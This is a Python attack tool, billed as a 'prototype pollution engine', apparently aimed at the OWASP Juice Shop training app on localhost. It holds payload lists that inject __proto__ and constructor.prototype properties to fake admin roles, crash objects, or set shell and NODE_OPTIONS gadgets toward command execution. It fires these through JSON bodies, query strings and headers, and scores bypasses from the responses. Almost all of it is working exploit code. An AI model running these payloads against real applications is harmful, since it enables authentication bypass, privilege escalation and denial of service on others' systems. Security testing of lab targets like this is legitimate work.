#!/usr/bin/env python3
"""
NOVA PROTOYPE POLLUTION ENGINE v1.0
JavaScript-specific object injection attack engine.
Targets: __proto__, constructor.prototype, Object.prototype pollution
Leads to: RCE, auth bypass, property injection, XSS, DoS
"""

import json
import time
import requests
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urljoin, quote


class NovaProtoPolluter:
    """
    Prototype Pollution exploitation engine.
    
    Attack Vectors:
    - __proto__ injection via JSON merge
    - constructor.prototype pollution
    - Object.assign() abuse
    - Deep merge vulnerabilities
    - Query string prototype pollution
    - Express/Node.js specific gadget chains
    """

    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Nova/4.0 (Proto Polluter)",
            "Accept": "application/json",
            "Content-Type": "application/json",
        })
        self.results = []
        self.successful_pollutions = []

    # ---------- PAYLOAD GENERATION ----------
    @staticmethod
    def generate_payloads() -> Dict[str, List[Dict]]:
        """Generate comprehensive prototype pollution payloads."""
        return {
            # Direct __proto__ injection
            "__proto__": [
                {"__proto__": {"isAdmin": True}},
                {"__proto__": {"role": "admin"}},
                {"__proto__": {"authenticated": True}},
                {"__proto__": {"isLoggedIn": True}},
                {"__proto__": {"admin": True}},
                {"__proto__": {"userRole": "admin"}},
                {"__proto__": {"canAccess": True}},
                {"__proto__": {"isAuthorized": True}},
                {"__proto__": {"type": "admin"}},
                {"__proto__": {"status": "verified"}},
            ],
            # Nested __proto__
            "nested_proto": [
                {"user": {"__proto__": {"isAdmin": True}}},
                {"data": {"__proto__": {"role": "admin"}}},
                {"profile": {"__proto__": {"admin": True}}},
                {"settings": {"__proto__": {"isAdmin": True}}},
                {"constructor": {"prototype": {"isAdmin": True}}},
            ],
            # Constructor pollution
            "constructor": [
                {"constructor": {"prototype": {"isAdmin": True}}},
                {"constructor": {"prototype": {"role": "admin"}}},
                {"constructor": {"prototype": {"authenticated": True}}},
                {"constructor": {"prototype": {"admin": True}}},
                {"constructor": {"prototype": {"isLoggedIn": True}}},
            ],
            # Object.assign style
            "object_assign": [
                {"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--require=/etc/passwd"}}},
                {"__proto__": {"shell": "/bin/sh", "input": "id"}},
                {"__proto__": {"NODE_OPTIONS": "--inspect-brk"}},
                {"__proto__": {"env": {"NODE_ENV": "development"}}},
            ],
            # DoS / Property Override
            "dos_override": [
                {"__proto__": {"toString": "polluted"}},
                {"__proto__": {"valueOf": "polluted"}},
                {"__proto__": {"hasOwnProperty": "polluted"}},
                {"__proto__": {"toJSON": "polluted"}},
                {"__proto__": {"length": 999999}},
            ],
            # Query string format
            "query_string": [
                "__proto__[isAdmin]=true",
                "__proto__.isAdmin=true",
                "__proto__%5BisAdmin%5D=true",
                "constructor[prototype][isAdmin]=true",
                "constructor.prototype.isAdmin=true",
            ],
            # JSON content-type alternatives
            "content_type_bypass": [
                {"__proto__": {"isAdmin": True}},
                {"__proto__": {"role": "admin"}},
            ],
            # Gadget chains for common libs
            "gadget_chains": [
                {"__proto__": {"ignore": True}},
                {"__proto__": {"allowAll": True}},
                {"__proto__": {"bypass": True}},
                {"__proto__": {"safe": False}},
                {"__proto__": {"secure": False}},
                {"__proto__": {"debug": True}},
                {"__proto__": {"verbose": True}},
                {"__proto__": {"testing": True}},
            ],
        }

    # ---------- DETECTION ----------
    def detect_pollution(self, response_before: requests.Response, response_after: requests.Response) -> Dict:
        """Compare responses to detect prototype pollution effects."""
        detection = {
            "polluted": False,
            "indicators": [],
            "differences": {},
        }

        # Status code change
        if response_before.status_code != response_after.status_code:
            detection["differences"]["status_code"] = {
                "before": response_before.status_code,
                "after": response_after.status_code,
            }
            if response_after.status_code in [200, 302] and response_before.status_code in [401, 403]:
                detection["polluted"] = True
                detection["indicators"].append("auth_bypass_by_status")

        # Response length change
        len_before = len(response_before.text)
        len_after = len(response_after.text)
        if abs(len_before - len_after) > 50:
            detection["differences"]["length"] = {
                "before": len_before,
                "after": len_after,
                "delta": len_after - len_before,
            }

        # Auth indicator patterns
        auth_indicators = ["admin", "role", "authenticated", "isAdmin", "isLoggedIn", "token", "dashboard"]
        for indicator in auth_indicators:
            in_before = indicator.lower() in response_before.text.lower()
            in_after = indicator.lower() in response_after.text.lower()
            if not in_before and in_after:
                detection["polluted"] = True
                detection["indicators"].append(f"auth_indicator:{indicator}")

        # Error patterns (pollution caused crash)
        error_patterns = ["TypeError", "ReferenceError", "is not a function", "undefined is not"]
        for pattern in error_patterns:
            if pattern.lower() in response_after.text.lower() and pattern.lower() not in response_before.text.lower():
                detection["polluted"] = True
                detection["indicators"].append(f"error_triggered:{pattern}")

        # JSON parsing difference
        try:
            json_before = response_before.json() if "json" in response_before.headers.get("content-type", "") else None
            json_after = response_after.json() if "json" in response_after.headers.get("content-type", "") else None
            if json_before and json_after and json_before != json_after:
                detection["differences"]["json_changed"] = True
        except:
            pass

        return detection

    # ---------- ATTACK EXECUTION ----------
    def pollute_via_json(self, endpoint: str, payload: Dict, method: str = "POST",
                          existing_data: Dict = None) -> Dict:
        """Inject prototype pollution via JSON body."""
        result = {
            "endpoint": endpoint,
            "method": method,
            "payload_type": "json",
            "payload": json.dumps(payload),
            "baseline": None,
            "polluted": None,
            "detection": {},
            "success": False,
        }

        url = f"{self.base_url}{endpoint}"

        try:
            # Baseline: normal request
            normal_data = existing_data or {"test": "baseline"}
            resp_before = self.session.request(method, url, json=normal_data, timeout=10)
            result["baseline"] = {
                "status": resp_before.status_code,
                "length": len(resp_before.text),
                "preview": resp_before.text[:200],
            }

            # Pollution request
            polluted_data = existing_data.copy() if existing_data else {}
            polluted_data.update(payload) if isinstance(payload, dict) else polluted_data.update({"payload": payload})
            
            resp_after = self.session.request(method, url, json=polluted_data, timeout=10)
            result["polluted"] = {
                "status": resp_after.status_code,
                "length": len(resp_after.text),
                "preview": resp_after.text[:200],
            }

            # Detect
            result["detection"] = self.detect_pollution(resp_before, resp_after)
            result["success"] = result["detection"]["polluted"]

            if result["success"]:
                self.successful_pollutions.append(result)
                print(f"     🔥 POLLUTION DETECTED! Indicators: {result['detection']['indicators']}")

        except Exception as e:
            result["error"] = str(e)[:200]

        self.results.append(result)
        return result

    def pollute_via_query_string(self, endpoint: str, qs_payload: str) -> Dict:
        """Inject prototype pollution via URL query string."""
        result = {
            "endpoint": endpoint,
            "method": "GET",
            "payload_type": "query_string",
            "payload": qs_payload,
            "baseline": None,
            "polluted": None,
            "detection": {},
            "success": False,
        }

        url = f"{self.base_url}{endpoint}"

        try:
            # Baseline
            resp_before = self.session.get(url, params={"test": "baseline"}, timeout=10)
            result["baseline"] = {
                "status": resp_before.status_code,
                "length": len(resp_before.text),
                "preview": resp_before.text[:200],
            }

            # Pollution via query string
            resp_after = self.session.get(url, params={"test": qs_payload}, timeout=10)
            result["polluted"] = {
                "status": resp_after.status_code,
                "length": len(resp_after.text),
                "preview": resp_after.text[:200],
            }

            result["detection"] = self.detect_pollution(resp_before, resp_after)
            result["success"] = result["detection"]["polluted"]

            if result["success"]:
                self.successful_pollutions.append(result)

        except Exception as e:
            result["error"] = str(e)[:200]

        self.results.append(result)
        return result

    def pollute_via_headers(self, endpoint: str, header_name: str, header_value: str) -> Dict:
        """Inject prototype pollution via HTTP headers (Express/Node specific)."""
        result = {
            "endpoint": endpoint,
            "method": "GET",
            "payload_type": "header",
            "payload": f"{header_name}: {header_value}",
            "baseline": None,
            "polluted": None,
            "detection": {},
            "success": False,
        }

        url = f"{self.base_url}{endpoint}"

        try:
            # Baseline
            resp_before = self.session.get(url, timeout=10)
            result["baseline"] = {
                "status": resp_before.status_code,
                "length": len(resp_before.text),
            }

            # Pollution via header
            headers = {header_name: header_value}
            resp_after = self.session.get(url, headers=headers, timeout=10)
            result["polluted"] = {
                "status": resp_after.status_code,
                "length": len(resp_after.text),
            }

            result["detection"] = self.detect_pollution(resp_before, resp_after)
            result["success"] = result["detection"]["polluted"]

            if result["success"]:
                self.successful_pollutions.append(result)

        except Exception as e:
            result["error"] = str(e)[:200]

        self.results.append(result)
        return result

    # ---------- VERIFICATION ----------
    def verify_pollution_persistence(self, check_endpoint: str) -> Dict:
        """
        Check if prototype pollution has persisted across requests.
        If pollution modified Object.prototype, effects should be visible.
        """
        result = {"endpoint": check_endpoint, "persistent": False, "indicators": []}

        try:
            resp = self.session.get(f"{self.base_url}{check_endpoint}", timeout=10)
            body = resp.text.lower()

            # Check for auth bypass indicators in unrelated endpoint
            if "admin" in body and "login" not in body:
                result["indicators"].append("admin_visible")
            if "isadmin" in body or '"role":"admin"' in body:
                result["indicators"].append("role_escalated")

            if result["indicators"]:
                result["persistent"] = True

        except Exception as e:
            result["error"] = str(e)[:100]

        return result

    # ---------- FULL ATTACK SUITE ----------
    def run_full_pollution_campaign(self, targets: List[Dict] = None) -> Dict:
        """Execute all prototype pollution attack vectors."""
        print("""
╔══════════════════════════════════════════════╗
║                                              ║
║   ☣️  NOVA PROTOTYPE POLLUTION ENGINE     ║
║   Object Injection & Gadget Chains        ║
║                                              ║
╚══════════════════════════════════════════════╝
        """)

        if targets is None:
            targets = [
                {"endpoint": "/api/Feedbacks", "method": "POST", "data": {"comment": "test", "rating": 3}},
                {"endpoint": "/rest/user/register", "method": "POST", "data": {"email": "nova_test@juice-sh.op", "password": "Test123!", "securityQuestion": "color?", "securityAnswer": "blue"}},
                {"endpoint": "/rest/products/search", "method": "GET", "data": None},
                {"endpoint": "/rest/basket/1/checkout", "method": "POST", "data": {"basketId": 1}},
                {"endpoint": "/api/Users", "method": "POST", "data": {"email": "proto_test@juice-sh.op", "password": "Test123!"}},
            ]

        report = {
            "timestamp": datetime.now().isoformat(),
            "target": self.base_url,
            "total_attempts": 0,
            "successful_pollutions": 0,
            "findings": [],
        }

        payloads = self.generate_payloads()

        for target in targets:
            endpoint = target["endpoint"]
            method = target["method"]
            existing_data = target.get("data")

            print(f"\n🎯 Target: {method} {endpoint}")

            # JSON-based pollution
            if method in ["POST", "PUT"]:
                print(f"   📦 Testing JSON __proto__ injection...")
                for payload in payloads["__proto__"][:5]:  # Top 5 payloads
                    result = self.pollute_via_json(endpoint, payload, method, existing_data)
                    report["total_attempts"] += 1
                    if result["success"]:
                        report["findings"].append(result)

                print(f"   📦 Testing constructor pollution...")
                for payload in payloads["constructor"][:3]:
                    result = self.pollute_via_json(endpoint, payload, method, existing_data)
                    report["total_attempts"] += 1
                    if result["success"]:
                        report["findings"].append(result)

                print(f"   📦 Testing gadget chains...")
                for payload in payloads["gadget_chains"][:3]:
                    result = self.pollute_via_json(endpoint, payload, method, existing_data)
                    report["total_attempts"] += 1
                    if result["success"]:
                        report["findings"].append(result)

            # Query string pollution
            if method == "GET":
                print(f"   🔗 Testing query string pollution...")
                for qs_payload in payloads["query_string"][:5]:
                    result = self.pollute_via_query_string(endpoint, qs_payload)
                    report["total_attempts"] += 1
                    if result["success"]:
                        report["findings"].append(result)

            time.sleep(0.1)  # Rate limit

        # Header-based pollution
        print(f"\n📋 Testing HTTP header pollution...")
        header_payloads = [
            ("X-Forwarded-For", "__proto__[isAdmin]=true"),
            ("X-Real-IP", "__proto__.role=admin"),
            ("Accept-Language", "constructor[prototype][admin]=true"),
        ]
        for header_name, header_value in header_payloads:
            result = self.pollute_via_headers("/rest/user/whoami", header_name, header_value)
            report["total_attempts"] += 1
            if result["success"]:
                report["findings"].append(result)

        # Verify persistence
        print(f"\n🔍 Verifying pollution persistence...")
        persistence = self.verify_pollution_persistence("/rest/user/whoami")
        report["persistence"] = persistence
        if persistence["persistent"]:
            print(f"   🔥 POLLUTION PERSISTED! Indicators: {persistence['indicators']}")
        else:
            print(f"   ❌ No persistent pollution detected")

        report["successful_pollutions"] = len(self.successful_pollutions)

        # Save
        with open("nova_proto_pollution_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)

        print(f"""
╔══════════════════════════════════════════╗
║   PROTO POLLUTION SUMMARY               ║
╠══════════════════════════════════════════╣
║  Total Attempts:       {report['total_attempts']:>3}              ║
║  Successful:           {report['successful_pollutions']:>3}              ║
║  Persistent:           {str(persistence['persistent']):>5}            ║
╚══════════════════════════════════════════╝
        """)

        return report


if __name__ == "__main__":
    polluter = NovaProtoPolluter(base_url="http://localhost:3000")
    report = polluter.run_full_pollution_campaign()
    
    if report["successful_pollutions"] > 0:
        print("\n🔥 SUCCESSFUL POLLUTIONS:")
        for finding in report["findings"]:
            print(f"   ⚡ {finding['endpoint']}: {finding['detection'].get('indicators', [])}")
